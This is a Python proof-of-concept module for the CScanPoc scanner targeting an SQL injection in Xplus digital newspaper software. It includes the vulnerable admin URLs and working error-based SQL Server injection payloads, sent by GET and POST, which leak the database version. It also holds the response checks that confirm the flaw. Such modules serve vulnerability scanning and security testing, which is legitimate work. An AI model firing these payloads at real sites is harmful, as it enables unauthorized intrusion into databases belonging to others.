# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Xplus_0001' # 平台漏洞编号，留空
    name = 'Xplusr数字报纸通用型注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-08-20'  # 漏洞公布时间
    desc = '''
        喜阅传媒（Xplus）新数通盛世科技数字报纸通用型注入漏洞：
        /www/index.php?mod=admin&con=deliver&act=view&deliId=1
        /www/index.php?mod=admin&con=user&act=view&id=1
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0114482
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'Xplus'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'xplus_0000' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = ["/www/index.php?mod=admin&con=deliver&act=view&deliId=1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--" ,# userId参数存在报错注入
                '/www/index.php?mod=admin&con=user&act=view&id=1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--',   
                ]
            for p in ps:
                url = arg + p
                code2, head, res, errcode, _ = hh.http(url )
                if (code2 ==200) and  ('ODBC SQL Server Driver' in res) and ('SQLExecute' in res) and ('GAO JI' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            p = 'www/index.php?mod=admin&con=subscribe&act=unsubscribelist'
            d = 'username=12\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--'
            url = arg + p
            code2, head, res, errcode, _ = hh.http(url,post=d)
            
            if (code2 ==200) and  ('ODBC SQL Server Driver' in res) and ('GAO JI' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()